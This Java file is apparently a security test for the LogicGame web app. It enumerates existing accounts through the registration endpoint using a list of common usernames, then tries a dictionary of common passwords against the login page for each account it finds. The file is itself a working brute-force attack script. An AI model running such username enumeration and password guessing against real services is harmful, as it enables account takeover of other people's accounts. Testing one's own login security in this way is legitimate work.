package uy.com.uma.logicgame.fe.test.seguridad;

import java.io.IOException;
import java.security.KeyException;
import java.util.ArrayList;
import java.util.Collection;
import java.util.UUID;

import uy.com.uma.comun.util.EncriptadorString;

/**
 * Lanza ataques contra el login del juego LogicGame
 * 
 * @author Santiago Dalchiele
 */
public class TestLoginAttack {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		
		final String urlBase = "http://192.168.184.169:8080/lgweb";
		final String urlLogin = urlBase + "/login.do";
		final String urlRegistro = urlBase + "/registro.do";		
		final String idioma = "en";
		final String [] claves = new String [] {"secret", "secreto", "secreta", "clave", "clave123", "adm1234", "qwer1234", "password",
				"123456", "12345678", "qwerty", "12345", "dragon", "pussy", "baseball", "football"};
		final String [] usuarios = new String [] {"admin", "administrador", "hugo", "diego", "jose", "pedro", "juan", "maria", "laura", "santiago",
				"111111", "123456", "12345678", "abc123", "abramov", "account", "accounting"};
		Collection<String> usuariosRegistrados = new ArrayList<String>();
		LoginAttack la = new LoginAttack(urlLogin);
		RegistroAttack ra = new RegistroAttack(urlRegistro);		
		ra.setIdioma(idioma);
		ra.setClave("clave");
		
		try {			
			for (String user : usuarios) {
				ra.setUsuario(user);
				ra.setCorreo(getRandomMail());
				final int resultado = ra.doAttack();
				
				if (resultado == 0)
			    	System.out.println("Error en parametros o conexion, usuario=[" + user + "] clave [" + ra.getClave() + 
			    						"], idioma [" + ra.getIdioma() + "], correo [" + ra.getCorreo() + "]");
			    else if (resultado == 1)
			    	System.out.println("Registro exitoso, usuario=[" + user + "] clave [" + ra.getClave() + "]");
			    else if (resultado == 4) {
			    	System.out.println("El usuario [" + user + "] EXISTE !!!");
			    	usuariosRegistrados.add(user);
			    } else if (resultado == 5)
			    	System.out.println("El correo ["+ ra.getCorreo() + "] EXISTE ???");
			}
			
			for (String usuario : usuariosRegistrados) {
				for (String clave : claves) {
					la.setUsuario(usuario);
					la.setClave(clave);
				    final int resultado = la.doAttack();
				    
				    if (resultado == 0)
				    	System.out.println("Error en parametros o conexion, usuario=[" + usuario + "] clave [" + clave + "]");
				    else if (resultado == 1) {
				    	System.out.println("Login exitoso !!!!!!, usuario=[" + usuario + "] clave [" + clave + "]");
				    	break;
				    } else if (resultado == 2)
				    	System.out.println("El usuario [" + usuario + "] no existe");
				    else if (resultado == 3)
				    	System.out.println("El usuario ["+ usuario + "] existe su clave NO es [" + clave + "]");
				}
			}
		} catch (IOException | KeyException e) {
			e.printStackTrace();
		}
	}
	
	
	
	/**
	 * Retorna un identificador de 32 caracteres elegido al azar
	 */
	private static String getRandomString32() throws KeyException {
		return EncriptadorString.encripta(UUID.randomUUID().toString()).replace("=", "").replace("+", "").replace("/", "").substring(0, 32);
	}
	
	
	
	/**
	 * Retorna una dirección de correo válida armada al azar
	 */
	private static String getRandomMail() throws KeyException {
		return getRandomString32() + "@" + getRandomString32() + ".com";
	}
}
